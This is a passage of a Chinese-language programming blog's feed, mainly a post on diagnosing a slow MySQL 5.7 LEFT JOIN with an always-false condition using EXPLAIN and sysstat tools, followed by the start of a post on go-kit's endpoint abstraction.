&lt;li>未解决误用滥用问题，仍需考虑如何兼顾中心化访问和私有配置隔离。&lt;/li>
&lt;/ul>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>两项重构的成本均在可控范围内，最终结果只能说勉强，还算是在预期内可接受。距离完全解决痛点仍然有不短的路要走。&lt;/p>
&lt;p>真正高价值的重构，比如建立缓存机制，还是需要对相关业务进一步研究理解和思考。&lt;/p></description></item><item><title>记一次MySQL JOIN优化</title><link>https://nnnewb.github.io/blog/p/note-of-mysql-join-optimize/</link><pubDate>Mon, 14 Mar 2022 12:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/note-of-mysql-join-optimize/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/note-of-mysql-join-optimize/image-20220314150141759.png" alt="Featured image of post 记一次MySQL JOIN优化" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>长话短说，这个性能问题是上周修一个bug的时候企图偷懒引入的。因为 xorm 在连接查询的时候模型结构必须是和 &lt;code>join&lt;/code> 的顺序保持一致，中间还不能有遗漏，不然查询结果填充到结构里的时候就会错位。&lt;/p>
&lt;p>而业务里这个条件又是可选的——用户不传的时候不需要 &lt;code>INNER JOIN&lt;/code>；但为了让 xorm 开心，同时尽量别把整个函数签名和返回类型都改了把影响范围搞太大，所以就偷了个懒：既然 xorm 要 &lt;code>JOIN&lt;/code> ，那就 &lt;code>LEFT JOIN&lt;/code>加个恒假的条件呗。于是就顺手写下了下面的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tbl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>没啥问题对吧？我当时也这么想的。&lt;/p>
&lt;h2 id="问题">问题&lt;/h2>
&lt;p>好了，问题来了。先把整个 SQL写下来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">INNER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_id&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_id&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resource_type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">offset&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>整个查询的实际耗时是 &lt;strong>919ms&lt;/strong>。&lt;/p>
&lt;p>&lt;em>why ?&lt;/em>&lt;/p>
&lt;h2 id="性能分析">性能分析&lt;/h2>
&lt;p>查询慢了第一反应还是是不是没索引，于是先看看 &lt;code>explain&lt;/code> 的结果。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>select_type&lt;/th>
&lt;th>table&lt;/th>
&lt;th>partitions&lt;/th>
&lt;th>type&lt;/th>
&lt;th>possible_keys&lt;/th>
&lt;th>key&lt;/th>
&lt;th>key_len&lt;/th>
&lt;th>ref&lt;/th>
&lt;th>rows&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>SIMPLE&lt;/td>
&lt;td>a&lt;/td>
&lt;td>&lt;/td>
&lt;td>ALL&lt;/td>
&lt;td>IDX_a_resource_id&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>456&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>SIMPLE&lt;/td>
&lt;td>b&lt;/td>
&lt;td>&lt;/td>
&lt;td>eq_ref&lt;/td>
&lt;td>PRIMARY&lt;/td>
&lt;td>PRIMARY&lt;/td>
&lt;td>8&lt;/td>
&lt;td>a.resource_id&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>SIMPLE&lt;/td>
&lt;td>d&lt;/td>
&lt;td>&lt;/td>
&lt;td>ref&lt;/td>
&lt;td>IDX_d_resource_id&lt;/td>
&lt;td>IDX_d_resource_id&lt;/td>
&lt;td>8&lt;/td>
&lt;td>a.resource_id&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>SIMPLE&lt;/td>
&lt;td>e&lt;/td>
&lt;td>&lt;/td>
&lt;td>ref&lt;/td>
&lt;td>IDX_e_resource_id&lt;/td>
&lt;td>IDX_e_resource_id&lt;/td>
&lt;td>9&lt;/td>
&lt;td>a.resource_id&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>SIMPLE&lt;/td>
&lt;td>c&lt;/td>
&lt;td>&lt;/td>
&lt;td>ALL&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>6405&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>驱动表是 &lt;code>a&lt;/code>，做了全表扫描，但数据量很小，只有400多行。但这个表是只增的，全表扫描还是不太对劲，于是看了眼索引，发现 &lt;code>result&lt;/code> 没有索引——但这个字段区分度不算很高，只有4个枚举值。&lt;/p>
&lt;p>网上随便搜的博客看到列区分度计算可以用 &lt;code>SELECT count(distinct col)/count(*) FROM tbl&lt;/code> 来计算，区分度越接近 1 则索引效果越好。&lt;code>result&lt;/code>的区分度只有&lt;code>0.0088&lt;/code>，个人感觉区别不大。这种情况下使用result索引滤出来的结果集会比较大，回表查询次数过多的话还不如就遍历一遍原表。&lt;/p>
&lt;p>想归想，但还是老实加上了 &lt;code>result&lt;/code> 索引，再 &lt;code>explain&lt;/code> 了一次，结果是 &lt;code>possible keys&lt;/code> 里多了 &lt;code>IDX_a_result&lt;/code>，但最 &lt;code>type&lt;/code> 还是 &lt;code>ALL&lt;/code>，说明确实和 &lt;code>result&lt;/code> 字段有没有索引没关系。&lt;/p>
&lt;p>再接着看下面，其他表基本不是主键就是二级索引，唯独 &lt;code>c&lt;/code> 表特立独行——也是&lt;code>ALL&lt;/code>。但这个表的 &lt;code>JOIN&lt;/code> 子句是这样的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这为啥要遍历？&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892.png"
width="304"
height="241"
srcset="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892_hu2478642e4d59f16d974ad0b870af7dc5_11307_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892_hu2478642e4d59f16d974ad0b870af7dc5_11307_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="执行计划"
class="gallery-image"
data-flex-grow="126"
data-flex-basis="302px"
>&lt;/p>
&lt;p>但看到 cost 只有 87.68，又松了口气，可能只是 &lt;code>explain&lt;/code> 输出不对吧，怎么想 &lt;code>ON 1 &amp;lt;&amp;gt; 1&lt;/code> 这样的条件也应该是常数时间内完成。&lt;/p>
&lt;p>到这里，思路已经完全走歪了，开始觉得是不是磁盘 IO 或者网络 IO 上有瓶颈？&lt;/p>
&lt;h3 id="sysstat-工具">sysstat 工具&lt;/h3>
&lt;p>这里介绍下一个很好用的 Linux 下性能分析工具，&lt;a class="link" href="https://github.com/sysstat/sysstat" target="_blank" rel="noopener"
>sysstat&lt;/a>。大部分发行版都可以直接用内置包管理器安装，如 Debian/Ubuntu 可以用 &lt;code>apt-get install sysstat&lt;/code> 安装。&lt;/p>
&lt;p>&lt;code>sysstat&lt;/code> 包含了各种在Unix、Linux环境下通用的工具，来监视系统性能和使用情况。这里面有很多好用的工具比如 &lt;code>sar&lt;/code>、&lt;code>iostat&lt;/code>、&lt;code>pidstat&lt;/code>。&lt;/p>
&lt;p>安装&lt;code>sysstat&lt;/code>之后还需要配置。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo dpkg-reconfigure sysstat
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后选 &lt;code>yes&lt;/code> 来启用定时任务自动收集数据到 &lt;code>/var/log/sysstat&lt;/code> ，这样 &lt;code>sar&lt;/code> 就可以导出报告了。&lt;/p>
&lt;p>&lt;code>sar&lt;/code> 是一个综合性的工具，可以收集、导出、保存系统活动数据，收集的数据包括：I/O、CPU、物理内存/Hugepage/Swap、虚拟内存、进程创建、中断、网络接口、socket、等等&amp;hellip;非常全面，基本能想到的都有。&lt;/p>
&lt;p>放在这个场景里，用 &lt;code>sar&lt;/code> 可以看到运行查询时的磁盘使用情况：&lt;code>sudo sar -bd 1&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">14时48分14秒 tps rtps wtps dtps bread/s bwrtn/s bdscd/s
14时48分15秒 40.00 1.00 39.00 0.00 8.00 312.00 0.00
14时48分14秒 DEV tps rkB/s wkB/s dkB/s areq-sz aqu-sz await %util
14时48分15秒 dev7-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-1 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-3 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-4 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-5 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-6 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-7 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev8-0 40.00 4.00 156.00 0.00 4.00 0.00 0.20 2.00
14时48分15秒 dev253-0 42.00 4.00 156.00 0.00 3.81 0.00 0.00 2.00
14时48分15秒 dev7-8 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
14时48分15秒 dev7-9 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不能说毫无波动，但显然和瓶颈应该扯不上关系了。但出于谨慎考虑，还是用 &lt;code>pidstat&lt;/code> 指定了 &lt;code>mysqld&lt;/code> 进程的 PID 来观察。这里多嘴一句，MySQL 是用 kubernetes 部署在办公室的服务器上的，我得提一嘴 &lt;code>sysstat&lt;/code> 是在宿主机上直接运行而不是容器里——这得说到容器隔离的原理，&lt;code>namespace&lt;/code>和&lt;code>cgroup&lt;/code>，在外层&lt;code>namespace&lt;/code>下是可以看到内层&lt;code>namespace&lt;/code>的进程的，但内层的&lt;code>namespace&lt;/code>看不到外层，是单向的隔离。所以可以直接在宿主机上用 &lt;code>ps&lt;/code> 看到 &lt;code>pause&lt;/code> 容器的进程以及 &lt;code>mysqld&lt;/code> 这种容器里的进程，也可以收集到各种使用率信息——因为共享宿主机的内核嘛。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">pidstat -d -p &lt;span class="m">11404&lt;/span> &lt;span class="m">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">14时57分19秒 UID PID kB_rd/s kB_wr/s kB_ccwr/s iodelay Command
14时57分20秒 999 11404 -1.00 -1.00 -1.00 0 mysqld
14时57分21秒 999 11404 -1.00 -1.00 -1.00 0 mysqld
14时57分22秒 999 11404 -1.00 -1.00 -1.00 0 mysqld
14时57分23秒 999 11404 -1.00 -1.00 -1.00 0 mysqld
14时57分24秒 999 11404 -1.00 -1.00 -1.00 0 mysqld
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就只能说毫无波动了，说那么多，并没有卵用。&lt;/p>
&lt;h2 id="转折">转折&lt;/h2>
&lt;p>一上午几乎都花费在这个查询上，终于在一次胡乱分析中注意到 CPU 使用率不同寻常：&lt;code>pidstat -p 11404 -d 1&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">15时01分01秒 UID PID %usr %system %guest %wait %CPU CPU Command
15时01分02秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld
15时01分03秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld
15时01分04秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld
15时01分05秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld
15时01分06秒 999 11404 6.00 0.00 0.00 0.00 6.00 1 mysqld
15时01分07秒 999 11404 39.00 0.00 0.00 0.00 39.00 1 mysqld
15时01分08秒 999 11404 52.00 0.00 0.00 0.00 52.00 1 mysqld
15时01分09秒 999 11404 65.00 0.00 0.00 0.00 65.00 1 mysqld
15时01分10秒 999 11404 53.00 0.00 0.00 0.00 53.00 1 mysqld
15时01分11秒 999 11404 66.00 0.00 0.00 0.00 66.00 6 mysqld
15时01分12秒 999 11404 85.00 0.00 0.00 0.00 85.00 6 mysqld
15时01分13秒 999 11404 5.00 0.00 0.00 0.00 5.00 6 mysqld
15时01分14秒 999 11404 0.00 0.00 0.00 0.00 0.00 6 mysqld
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314150141759.png"
width="756"
height="310"
srcset="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314150141759_hu8ccdbbcbbb5906798b24061f7093764d_181309_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314150141759_hu8ccdbbcbbb5906798b24061f7093764d_181309_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="这彩色输出是真舒服"
class="gallery-image"
data-flex-grow="243"
data-flex-basis="585px"
>&lt;/p>
&lt;p>在运行查询时，CPU使用率飙升到了50%~85%，一个简单的查询几乎跑满了一个核心？如果 ctrl+enter 按得稍微勤快一点，这个使用率最高能跑到 105% ——这还是因为我在 kubernetes 只给了 1 CPU 的配额的缘故。于是瓶颈终于暴露了出来：CPU。这谁能想到呢。&lt;/p>
&lt;p>再回过头分析查询，结合一下脑子里沉睡已久的记忆+谷歌一下，问题终于浮出水面。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892.png"
width="304"
height="241"
srcset="https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892_hu2478642e4d59f16d974ad0b870af7dc5_11307_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/note-of-mysql-join-optimize/image-20220314135914892_hu2478642e4d59f16d974ad0b870af7dc5_11307_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="执行计划"
class="gallery-image"
data-flex-grow="126"
data-flex-basis="302px"
>&lt;/p>
&lt;p>对，&lt;code>nested_loop#5&lt;/code>，MySQL 的执行计划忠实反映了实际做的事情。MySQL 真就，对着 &lt;code>LEFT JOIN ... ON 1 &amp;lt;&amp;gt; 1&lt;/code> 这个条件，在嵌套循环里，做了个全表扫描&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>所谓&lt;code>nested_loop&lt;/code>，就是&lt;code>for range { for range {}}&lt;/code> 这样的执行路径，简单地把 &lt;code>Rows&lt;/code> 乘一下就能得到实际处理了多少行：&lt;code>6450*456=2920680&lt;/code>，一共 292 万行，难怪 CPU 使用率会如此之高，难怪数据量这么小的两个表做查询居然会花费接近1s的时间。&lt;/p>
&lt;h2 id="解决">解决&lt;/h2>
&lt;p>知道了瓶颈，找到了造成瓶颈的代码，那么应该就好解决了——话虽如此，要我给出解决办法的话确实就是一句话的事情，但为了找出这个解决办法反而浪费了不少时间。&lt;/p>
&lt;p>回顾造成问题的 &lt;code>JOIN&lt;/code> 子句，&lt;code>LEFT JOIN ... ON 1 &amp;lt;&amp;gt; 1&lt;/code>，&lt;code>1 &amp;lt;&amp;gt; 1&lt;/code> 是恒假条件，但 MySQL 对这个条件选择了全表扫描这种完全无法理解的处理方式。&lt;/p>
&lt;p>行，那我直接改成 &lt;code>ON FALSE&lt;/code>，总不至于连 &lt;code>FALSE&lt;/code> 也能给个全表扫描的执行计划吧？对，还真能，MySQL 真有你的&amp;hellip;&lt;/p>
&lt;p>随后还试了 &lt;code>0 &amp;gt; 1&lt;/code>、&lt;code>1 &amp;lt; 0&lt;/code>、&lt;code>1=2&lt;/code>、&lt;code>1 is null&lt;/code> 等等条件，无一例外 MySQL 的执行计划都是 nested_loop + 全表扫描，就在快放弃的时候偶然想到既然说什么都要扫表，那我让 MySQL 扫就是了，给个有索引的字段让 MySQL 不要全表扫描，也能改善很多吧？然后就随手写下 &lt;code>c.id=-1&lt;/code>。&lt;/p>
&lt;p>然后 MySQL 的执行计划就从全表扫描变成了常数时间&amp;hellip;真有你的啊 MySQL！&lt;/p>
&lt;p>又试了下 &lt;code>c.id is null&lt;/code> 同样也是常数时间，所以MySQL犯傻的原因是优化器没考虑到有我这样的 &lt;strong>聪（臭）明（傻）人（B）&lt;/strong> 会往条件里写个 FALSE 是吧&amp;hellip;真有你的啊 MySQL！&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol start="0">
&lt;li>不要忽略 explain 给出的线索。&lt;/li>
&lt;li>注意 &lt;code>nested_loop&lt;/code>，&lt;code>join&lt;/code> 的条件不能太宽泛，否则遍历的数据量会爆炸性增长，后果就是查询时间随随便便翻几百倍。
&lt;ol>
&lt;li>最高效的 &lt;code>join&lt;/code> 当然是直接走主键，查一个元素，聚簇索引，不用回表，查询时间复杂度不变。&lt;/li>
&lt;li>次一级的走二级索引，查一个元素，回表一次也就完了，查询时间复杂度不变。&lt;/li>
&lt;li>再次一级的索引区分度不足1，查找出来多个元素，回表多次，嵌套循环的话会成倍放大驱动表的时间复杂度。&lt;/li>
&lt;li>最差的情况，索引区分度太差或者没索引，被迫嵌套循环+全表扫描，也就是我碰到的情况，生产下负载提上来一点就大概率要GG。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>MySQL 的优化器需要在条件里给个列，就算是恒真或者恒假的条件，也一定要给个列，不然MySQL就会跟个傻逼一样选择全表扫描。
&lt;ol>
&lt;li>我的环境是 MySQL 5.7.33，InnoDB 5.7.33，MySQL Community Server，新版本 MySQL 不知道有没有解决。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>&lt;code>sysstat&lt;/code> 这套工具很好用，如果没把可观测性的基础设施(各种&lt;code>reporter&lt;/code>+&lt;code>prometheus&lt;/code>+&lt;code>grafana&lt;/code>)搞好的话，&lt;code>sysstat&lt;/code> 值得拥有。&lt;/li>
&lt;/ol></description></item><item><title>gokit 架构之我见</title><link>https://nnnewb.github.io/blog/p/my-opinion-of-gokit-architecture/</link><pubDate>Wed, 02 Mar 2022 12:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/my-opinion-of-gokit-architecture/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这是看了 &lt;a class="link" href="https://github.com/go-kit/kit/issues/843" target="_blank" rel="noopener"
>Go kit: the road ahead&lt;/a> 之后，对 go kit 这套抽象的一些想法。主要是关于 endpoint 是否有必要、generic 会如何影响 go kit 的架构、go kit 的代码生成这些问题。&lt;/p>
&lt;h2 id="endpoint-抽象层是否必要存在">endpoint 抽象层是否必要存在&lt;/h2>
&lt;p>我的看法是需要。原因下面分析。&lt;/p>
&lt;p>一个没有额外功能的 Endpoint 其实是起到了把请求类型适配到 Go 函数签名的作用。&lt;a class="link" href="http://gokit.io/examples/stringsvc.html#endpoints" target="_blank" rel="noopener"
>stringsvc&lt;/a> 实现如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;context&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/kit/endpoint&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">makeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="nx">StringService&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">uppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">()},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">makeCountEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="nx">StringService&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">countRequest&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">countResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
